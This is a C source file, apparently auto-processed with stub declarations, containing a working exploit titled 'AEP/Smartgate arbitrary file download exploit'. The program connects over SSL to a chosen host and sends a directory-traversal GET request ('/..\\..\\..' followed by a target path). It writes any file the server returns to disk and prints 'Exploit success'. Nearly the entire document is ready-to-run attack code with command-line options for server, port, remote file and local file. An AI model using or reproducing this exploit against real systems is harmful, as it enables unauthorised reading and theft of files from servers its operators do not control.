#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct option {char* member_0; int member_1; char member_3; int /*<<< orphan*/  member_2; } ;
typedef  int /*<<< orphan*/  SSL_CTX ;
typedef  int /*<<< orphan*/  SSL ;
typedef  int /*<<< orphan*/  BIO ;

/* Variables and functions */
 scalar_t__ BIO_do_connect (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  BIO_free_all (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  BIO_get_ssl (int /*<<< orphan*/ *,int /*<<< orphan*/ **) ; 
 int /*<<< orphan*/ * BIO_new_ssl_connect (int /*<<< orphan*/ *) ; 
 int BIO_read (int /*<<< orphan*/ *,char*,int) ; 
 int /*<<< orphan*/  BIO_set_conn_hostname (int /*<<< orphan*/ *,char*) ; 
 int /*<<< orphan*/  BIO_write (int /*<<< orphan*/ *,char*,int) ; 
 int /*<<< orphan*/  ERR_load_BIO_strings () ; 
 int /*<<< orphan*/  ERR_print_errors_fp (int /*<<< orphan*/ ) ; 
 int O_CREAT ; 
 int O_RDWR ; 
 int /*<<< orphan*/  OpenSSL_add_all_algorithms () ; 
 int /*<<< orphan*/  SSL_CTX_free (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * SSL_CTX_new (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  SSL_MODE_AUTO_RETRY ; 
 int /*<<< orphan*/  SSL_load_error_strings () ; 
 int /*<<< orphan*/  SSL_set_mode (int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  SSLv23_client_method () ; 
 int /*<<< orphan*/  S_IRWXU ; 
 int /*<<< orphan*/  close (int) ; 
 int /*<<< orphan*/  exit (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  free (char*) ; 
 int getopt_long (int,char**,char*,struct option*,int*) ; 
 char* malloc (int) ; 
 int /*<<< orphan*/  memset (char*,int /*<<< orphan*/ ,int) ; 
 int open (char*,int,int /*<<< orphan*/ ) ; 
 char* optarg ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int /*<<< orphan*/  sprintf (char*,char*,char*,...) ; 
 int /*<<< orphan*/  stderr ; 
 int strlen (char*) ; 
 scalar_t__ strstr (char*,char*) ; 
 int /*<<< orphan*/  write (int,char*,int) ; 

int main(int argc,char *argv[])
{
    BIO * bio;
    SSL * ssl;
    SSL_CTX * ctx;
    int p,c,fd,index = 0;
    unsigned long size = 0;
    int ihost = 0, iport = 0, ifile = 0, ilocal = 0, check = 0;
    char *host,*request,*file,*connect,*port,*httpbuf,*httpbuf2;
    char *http1 = "GET /..\\..\\..\\..\\..\\..\\..\\";
    char *http2 = " HTTP/1.1\x0D\x0A\x0D\x0A\x0D\x0A\x0D\x0A";
    char r[1024];
    static struct option options[]= {
	    {"server", 1, 0, 's'},
	    {"port", 1 , 0, 'p'},
	    {"remotefile", 1, 0, 'f'},
	    {"localfile", 1, 0, 'l'},
	    {"help", 0, 0, 'h'}
    };
    printf("[ AEP/Smartgate arbitrary file download exploit\n");
    while(c != -1)
    {
	    c = getopt_long(argc,argv,"s:p:f:l:h",options,&index);
	    switch(c){
		case -1:
			    break;
		case 's':
			    host = malloc(strlen(optarg) + 1);
			    sprintf(host,"%s",optarg);
			    ihost = 1;
			    break;
		case 'p':
			    port = malloc(strlen(optarg) + 1);
			    sprintf(port,"%s",optarg);
			    iport = 1;
			    break;
		case 'f':
			    request = malloc(strlen(optarg) + strlen(http1) + strlen(http2) + 1);
			    sprintf(request,"%s%s%s",http1,optarg,http2);
			    ifile = 1;
			    break;
		case 'l':
			    file = malloc(strlen(optarg) + 1);
			    sprintf(file,"%s",optarg);
			    ilocal = 1;
			    break;
		case 'h':
			    printf("[\n[ %s\n",argv[0]);
			    printf("[   --server|-s <dns/ip>\n");
			    printf("[   --port|-p <port>\n");
			    printf("[   --remotefile|-f <path/and/file>\n");
			    printf("[   --localfile|-l <localfile/to/saveas>\n");
			    printf("[\n[ For a more detailed explanation read the source\n");
			    exit(0);
			    break;
		default:
			    break;
			    
	    }
    }
    if(ihost != 1 || iport != 1 || ifile != 1 || ilocal != 1){
	    printf("[ Try %s --help\n",argv[0]);
	    exit(0);
    }
    ERR_load_BIO_strings();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    ctx = SSL_CTX_new(SSLv23_client_method());
    bio = BIO_new_ssl_connect(ctx);
    BIO_get_ssl(bio, & ssl);
    SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);
    connect = malloc(strlen(host) + strlen(port) + 2);
    sprintf(connect,"%s:%s",host,port);
    BIO_set_conn_hostname(bio, connect);
    if(BIO_do_connect(bio) <= 0)
    {
        fprintf(stderr, "[ Error attempting to connect\n");
        ERR_print_errors_fp(stderr);
        BIO_free_all(bio);
        SSL_CTX_free(ctx);
        return 0;
    }
    printf("[ Connected to %s via (%s/tcp)\n",host,port);
    BIO_write(bio, request, strlen(request));
    check = 0;
    httpbuf = malloc(2);
    memset(httpbuf,0,2);
    while(check == 0)
    {
    	p = BIO_read(bio, r, 1);
    	r[p] = 0;
	httpbuf2 = malloc(strlen(r) + strlen(httpbuf) + 1);
    	sprintf(httpbuf2,"%s%s",httpbuf,r);
	free(httpbuf);
	httpbuf = httpbuf2;
	check = (int)strstr(httpbuf,"\n\n");
    }
    printf("[ Displaying raw HTTP response details\n");
    printf("%s",httpbuf);
    check = 0;
    check = (int)strstr(httpbuf,"200 OK");
    if(check != 0)
    {
	printf("[ Exploit success, file found\n");
    	fd = open(file,O_RDWR|O_CREAT,S_IRWXU);
    	if(fd == -1){
		    printf("[ Error creating %s",file);
		    exit(0);
    	}
    	for(;;)
    	{
       		p = BIO_read(bio, r, 1023);
        	if(p <= 0) break;
       	        r[p] = 0;
		write(fd,r,p);
		size = size + p;
    	}
	printf("[ Recieved %u byte(s) and saved as '%s'\n",size,file);
	close(fd);
    }
    if(check==0)
    {
    	check = (int)strstr(httpbuf,"301 Moved");
   	 if(check != 0)
    	{
		    printf("[ Exploit success, directory found\n");
    	}
    }
    free(httpbuf);
    if(check == 0)
    {
	    printf("[ Exploit failed\n");
    }
    BIO_free_all(bio);
    SSL_CTX_free(ctx);
    return 0;
}